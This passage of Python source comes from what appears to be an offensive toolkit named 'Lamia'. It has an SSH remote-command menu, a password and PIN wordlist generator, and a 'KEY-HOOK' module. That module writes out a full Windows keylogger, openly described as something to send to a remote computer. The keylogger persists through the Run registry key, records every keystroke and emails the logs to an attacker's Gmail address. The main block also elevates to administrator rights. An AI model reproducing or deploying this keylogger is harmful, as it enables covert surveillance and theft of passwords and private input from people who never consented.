            f'By Using this module you can connect to remote computer and control \nthis computer using {Bcolors.WARNING}SSH.{Bcolors.ENDC}\nOnce connected, you can execute the command on a remote computer.\nDo you want to connect {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        print(70 * '-')
        command_ssh = input('> ')
        if command_ssh.upper() == 'N':
            MainMenu().menu()
        elif command_ssh.upper() == 'Y':
            SSH().ssh_command()
        else:
            print(f"{Bcolors.Error}WRONG OPTION!{Bcolors.ENDC} The script returns to the main menu")
            time.sleep(2)
            MainMenu().menu()

    @staticmethod
    def ssh_command():
        Clear.clear()
        print(30 * '-' + f'{Bcolors.Magenta}SSH MODULE{Bcolors.ENDC}' + 30 * '-')
        time.sleep(0.25)
        print(f'After connection if you want to disconnect type {Bcolors.WARNING}0{Bcolors.ENDC}')
        print(f'Type {Bcolors.WARNING}IP{Bcolors.ENDC}: ', end='')
        ip_ssh = input('')
        print(f'Type {Bcolors.WARNING}Port{Bcolors.ENDC}: ', end='')
        port_ssh = input('')
        print(f'Type {Bcolors.WARNING}Login{Bcolors.ENDC}: ', end='')
        login_shh = input('')
        print(f'Type {Bcolors.WARNING}Password{Bcolors.ENDC}: ', end='')
        password_ssh = input('')
        Clear.clear()
        try:
            while True:
                client = paramiko.SSHClient()
                client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
                client.connect(ip_ssh, port=int(port_ssh), username=login_shh, password=password_ssh, timeout=5)
                ssh_session = client.get_transport().open_session()
                if ssh_session.active:
                    command_shh_connected = input('Command: ')
                    if command_shh_connected != '0':
                        ssh_session.exec_command(command_shh_connected)
                        print(ssh_session.recv(1024).decode('UTF-8'))
                    elif command_shh_connected == '0':
                        if client:
                            client.close()
                            input(f"\n{Bcolors.WARNING}Disconnecting ...{Bcolors.ENDC}\nPress any key to continue ...")
                            MainMenu().menu()

        except socket.gaierror:
            print(f"{Bcolors.Error}Can't find host!{Bcolors.ENDC}\nDo you want to try to connect to a different host?{Bcolors.WARNING} y/n{Bcolors.ENDC}")
            print(70 * '-')
            ssh_again = input('> ')
            SSH().ssh_command() if ssh_again.upper() == 'Y' else MainMenu().menu()
        except paramiko.ssh_exception.AuthenticationException:
            print(f"{Bcolors.Error}Wrong credentials!{Bcolors.ENDC}\nDo you want to try to connect again?{Bcolors.WARNING} y/n{Bcolors.ENDC}")
            print(70 * '-')
            ssh_again = input('> ')
            SSH().ssh_command() if ssh_again.upper() == 'Y' else MainMenu().menu()


class KeyHook(UserInfo):

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()
        self.check_default_key_hook_save: str = ''

    @staticmethod
    def key_hook_check_compatibility():
        if os.name == 'nt':
            KeyHook().menu_key_hook()
        elif os.name != 'nt':
            print(f'{Bcolors.Error}Error!{Bcolors.ENDC} Is not available on {Bcolors.WARNING}LINUX{Bcolors.ENDC} yet.')
            time.sleep(2)
            MainMenu().menu()

    def menu_key_hook(self):
        print(70 * '-')
        print(
            f'Using this module you can generate{Bcolors.WARNING} KEY-HOOK{Bcolors.ENDC}.\nAfter generating {Bcolors.WARNING}KEY-HOOK{Bcolors.ENDC} you can sent him to remote computer.\nWhen you run this script on other machines, script will hide in procces.\nWhen remote computer starts up again, script too.\nScript will sent all symbols input from keyboard to given address email.\nDo you want to continue? {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        print(70 * '-')
        key_hook_command = input('> ')
        if key_hook_command.upper() == 'Y':
            Clear.clear()
            KeyHook().key_hook_generator()
        elif key_hook_command.upper() == 'N':
            MainMenu().menu()
        else:
            print(f"{Bcolors.Error}WRONG OPTION!{Bcolors.ENDC} The script returns to the main menu")
            time.sleep(2)
            MainMenu().menu()

    def key_hook_generator(self):
        print(26 * '-' + f'{Bcolors.Magenta}KEY-HOOK GENERATOR{Bcolors.ENDC}' + 26 * '-')
        print(f'For now working only with {Bcolors.WARNING}GMAIL{Bcolors.ENDC}')
        time.sleep(2)
        Clear.clear()
        try:
            if os.path.isdir(rf'C:\Users\{self.user_name}\Desktop'):
                if os.path.abspath(rf'C:\Users\{self.user_name}\Desktop') == rf'C:\Users\{self.user_name}\Desktop':
                    self.check_default_key_hook_save = rf'C:\Users\{self.user_name}\Desktop\winup.pyw'
        except SyntaxError:
            print(f'I have problems with save!')
            time.sleep(2)
        finally:
            with open(self.check_default_key_hook_save, 'w') as f:
                f.write(r"""# -*- coding: utf-8 -*-
from ctypes import *
import pythoncom
import pynput 
from pynput.keyboard import Key, Listener 
import win32clipboard
import smtplib
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
import sys, os
from os import path
import socket
import datetime
import getpass
import winreg
user32 = windll.user32
kernel32 = windll.kernel32
psapi = windll.psapi
current_window = None
USER_NAME = getpass.getuser()
keyVal = 'Software\Microsoft\Windows\CurrentVersion\Run'
def add_to_registry():
    try:
        key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, keyVal, 0, winreg.KEY_ALL_ACCESS)
    except:
        key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, keyVal)
    winreg.SetValueEx(key, "lx", 0, winreg.REG_SZ, rf"C:\Users\{USER_NAME}\Desktop\winup.pyw")
    winreg.CloseKey(key)
def get_current_process():
    hwnd = user32.GetForegroundWindow()
    pid = c_ulong(0)
    user32.GetWindowThreadProcessId(hwnd, byref(pid))
    process_id = "%d" % pid.value
    executable = create_string_buffer(b"\x00" * 512)
    h_process = kernel32.OpenProcess(0x400 | 0x10, False, pid)
    psapi.GetModuleBaseNameA(h_process, None, byref(executable), 512)
    window_title = create_string_buffer(b"\x00" * 512)
    length = user32.GetWindowTextA(hwnd, byref(window_title), 512)
    print()
    print("[ PID: %s - %s - %s ]" % (process_id, executable.value, window_title.value))
    print()
    # zamknięcie uchwytów
    kernel32.CloseHandle(hwnd)
    kernel32.CloseHandle(h_process)
keys = [] 
def on_press(key):
    keys.append(key) 
    write_file(keys) 
    try:
        pass  
    except AttributeError:
        print('') 
def write_file(keys):
    b = os.path.getsize(rf"C:\Users\{USER_NAME}\log.txt")
    key = rf"C:\Users\{USER_NAME}\log.txt"
    ip = socket.gethostbyname(socket.gethostname())
    date = datetime.datetime.now()
    date = date.strftime("%Y-%m-%d %H:%M")
    if b > 100:
        subject = f'IP: {ip}'
        message = f'Time: {date}'
        file_location = key
        msg = MIMEMultipart()
        msg['From'] = email
        msg['To'] = send_to_email
        msg['Subject'] = subject
        msg.attach(MIMEText(message, 'plain'))
        filename = os.path.basename(file_location)
        attachment = open(file_location, "rb")
        part = MIMEBase('application', 'octet-stream')
        part.set_payload(attachment.read())
        encoders.encode_base64(part)
        part.add_header('Content-Disposition', "attachment; filename= %s" % filename)
        msg.attach(part)
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(email, password)
        text = msg.as_string()
        server.sendmail(email, send_to_email, text)
        server.quit()
    with open(rf'C:\Users\{USER_NAME}\log.txt', 'w') as f: 
        for key in keys: 
            k = str(key).replace("'", "")
            if k == 'Key.space':
                f.write(' ')
            elif k == 'Key.shift_r' or k == 'Key.shift' or k == 'Key.esc' or k =='Key.backspaceping' or k == 'Key.backspace' or k == 'Key.ctrl_l':
                pass
            elif k == 'Key.tab' or k == 'Key.enter':
                f.write('\n')
            else: 
                f.write(k)
def KeyStroke(event):
    global current_window
    if event.WindowName != current_window:
        current_window = event.WindowName
        get_current_process()
    #global x
    #x = []
    #if event.Ascii > 32 and event.Ascii < 127:
        #x.append(event.Ascii)
        #x = ''.join(chr(i) for i in x)
        #with open(key, 'a') as fp:
            #fp.write(f'{x}')
    #if event.Ascii == 32 or event.Ascii == 9 or event.Ascii == 13:
        #with open(key, 'a') as fp:
            #fp.write('\n')
                """)
            print(f'Two email addresses {Bcolors.WARNING}required{Bcolors.ENDC}')
            print('Write the email name through which the script will send data: ', end='')
            sender_email = str(input())
            print('Write password of this email: ', end='')
            key_password = str(input())
            server = smtplib.SMTP_SSL('smtp.gmail.com', 465)
            try:
                server.login(f'{sender_email}', f'{key_password}')
            except smtplib.SMTPAuthenticationError:
                print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong Credentials!')
                server.quit()
                os.remove(rf'C:\Users\{self.user_name}\Desktop\winup.pyw')
                time.sleep(2)
                MainMenu().menu()
            server.quit()
            print('Here write email name where script will send data: ', end='')
            key_send_to_email = str(input())
            print(
                f'The script will send all symbols from the keyboard on the computer on which it will run to this email address: {Bcolors.WARNING}{key_send_to_email}{Bcolors.ENDC}')
            input('Press enter to continue...')
            with open(rf'C:\Users\{self.user_name}\log.txt', 'w') as f:
                f.write(str('='))
            with open(self.check_default_key_hook_save, 'a') as f:
                f.write(rf"""
email = f'{sender_email}'
password = f'{key_password}'
send_to_email = f'{key_send_to_email}'
add_to_registry()
listener = Listener(on_press=on_press)
listener.start()
pythoncom.PumpMessages()
            """)
            print()
            print(f'Script saved here: {Bcolors.WARNING}{self.check_default_key_hook_save}{Bcolors.ENDC}')
            time.sleep(3)
            Clear.clear()
        MainMenu().menu()


class PasswordGenerator(UserInfo):
    start_time: float

    def __repr__(self):
        return f"{self.__class__.__name__}"

    def __init__(self):
        super().__init__()
        self.check_default_choice_pin: str = ''
        self.PIN: str = rf'C:\Users\{self.user_name}\Desktop\PIN.txt' if os.name == 'nt' else rf'/root/PIN.txt'
        self.password_save = rf'C:\Users\{self.user_name}\Desktop\PASSWORDS.txt' if os.name == 'nt' else rf'/root/PASSWORDS.txt'

    def password_generator_start(self):
        print(70 * '-')
        print(f'This module allows you to {Bcolors.WARNING}GENERATE ALL PASSWORD COMBINATION{Bcolors.ENDC} \nof the symbols given.\nDo you want to continue {Bcolors.WARNING}y/n{Bcolors.ENDC} ?')
        print(70 * '-')
        password_generator_start_choice = input('> ')
        if password_generator_start_choice.lower() == 'y':
            PasswordGenerator.password_generator_menu(self)
        elif password_generator_start_choice.lower() == 'n':
            MainMenu().menu()
        else:
            print(f"{Bcolors.Error}WRONG OPTION!{Bcolors.ENDC} The script returns to the main menu")
            time.sleep(2)
            MainMenu().menu()

    def password_generator_menu(self):
        Clear.clear()
        print(22 * '-' + f'{Bcolors.Magenta}PASSWORD GENERATOR MODULE {Bcolors.ENDC}' + 22 * '-')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}1.Password generator{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}2.PIN generator{Bcolors.ENDC}')
        time.sleep(0.25)
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        time.sleep(0.25)
        print(70 * '-')
        password_generator_menu_choice = str(input('> '))
        Clear.clear()
        if password_generator_menu_choice == '1':
            PasswordGenerator.password_generator_characters_choice(self)
        elif password_generator_menu_choice == '2':
            PasswordGenerator.pin_generator(self)
        elif password_generator_menu_choice == '0':
            MainMenu().menu()
        else:
            print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong option!')
            time.sleep(1)
            PasswordGenerator.password_generator_menu(self)

    def password_generator_characters_choice(self):
        Clear.clear()
        print(20 * '-' + f'{Bcolors.Magenta}PASSWORD GENERATOR MODULE MENU{Bcolors.ENDC}' + 20 * '-')
        print('Select the characters of which the password will consist')
        print(f'{Bcolors.WARNING}1.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z]{Bcolors.ENDC}\n')
        print(
            f'{Bcolors.WARNING}2.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z,!,@,#,$,%,^,&,\n*,(,),=,+,.,?,~]{Bcolors.ENDC}\n')
        print(f'{Bcolors.WARNING}3.[A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z]{Bcolors.ENDC}\n')
        print(
            f'{Bcolors.WARNING}4.[A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z,!,@,#,$,%,^,&,\n*,(,),=,+,.,?,~]{Bcolors.ENDC}\n')
        print(
            f'{Bcolors.WARNING}5.[a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,r,s,t,u,w,x,y,z,A,B,C,D,E,F,G,\nH,I,J,K,L,M,N,O,P,R,S,T,U,W,Y,X,Z,!,@,#,$,%,^,&,*,(,),=,+,.,?,~]{Bcolors.ENDC}\n')
        print(f'{Bcolors.WARNING}0.BACK TO MAIN MENU{Bcolors.ENDC}')
        print(70 * '-')
        password_characters_choice = int(input('> '))
        collection_of_characters = {1: 'abcdefghijklmnoprstquwxyz', 2: 'abcdefghijklmnoprstquwxyz!@#$%^&*()=+.?~', 3: 'ABCDEFGHIJKLMNOPRSTQUWXYZ', 4: 'ABCDEFGHIJKLMNOPRSTQUWXYZ!@#$%^&*()=+,.?~',
                                    5: 'abcdefghijklmnoprstquwxyzABCDEFGHIJKLMNOPRSTQUWXYZ!@#$%^&*()=+,.?~'}
        Clear.clear()
        if password_characters_choice == 0:
            MainMenu().menu()
        try:
            selected_characters = collection_of_characters[password_characters_choice]
            print('Enter the password length [number]: ', end='')
            password_length = int(input())
            if password_length > 25:
                Clear.clear()
                print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} To long!\n')
                os.system('pause') if os.name == 'nt' else input('Press enter to continue...')
                PasswordGenerator.password_generator_characters_choice(self)
            print('Enter the numbers of password [number]: ', end='')
            number_of_passwords = int(input())
            self.password_generator_function(characters=selected_characters, length=password_length, how_many=number_of_passwords)
        except KeyError:
            print(f'{Bcolors.Error}ERROR!{Bcolors.ENDC} Wrong option!')
            time.sleep(1)
            PasswordGenerator.password_generator_characters_choice(self)

    def password_generator_function(self, characters, length, how_many):
        start_time = time.time()
        with open(self.password_save, 'w') as f:
            [f.write(str((random.sample(characters, length))).replace(',', '').replace("'", "").replace(' ', '')[1:-1] \
                     + str(f'\n')) for _ in range(how_many)]
        f.close()
        print('\n')
        print(f'{Bcolors.Pass}\nSuccess!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.password_save}{Bcolors.ENDC}')
        print(f'Number of generated passwords: {Bcolors.WARNING}{how_many}{Bcolors.ENDC}')
        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % round((time.time() - start_time), 4))
        input('Press enter to continue...')
        PasswordGenerator.password_generator_menu(self)

    def pin_generator(self):
        start_time = time.time()
        with open(self.PIN, 'w') as f:
            for self.c, self.pin in enumerate(list(product(range(10), repeat=4)), 1):
                f.write(str("%s%s%s%s" % self.pin) + str(f'\n'))
            print()
            print(f'Numbers of generated items: {Bcolors.WARNING}{self.c}{Bcolors.ENDC}')

        print(f"Execution time: {Bcolors.WARNING}%s{Bcolors.ENDC} seconds" % round((time.time() - start_time), 4))
        print(f'{Bcolors.Pass}Success!{Bcolors.ENDC} Script save output here {Bcolors.WARNING}{self.PIN}{Bcolors.ENDC}')
        input('Press enter to continue...')
        PasswordGenerator.password_generator_menu(self)


if __name__ == '__main__':
    try:
        if os.name == 'nt':
            from elevate import elevate

            elevate()
        scanned_network_areas = PossibleAreaNetworks()
        L = Lamia()
        L.start_up()
    except ModuleNotFoundError:
        print('One module not found. Lamia will install that module automatically...')
        if os.name == 'nt':
            subprocess.call('pip install elevate', stderr=subprocess.DEVNULL, stdout=subprocess.DEVNULL)

# VERSION 2.4
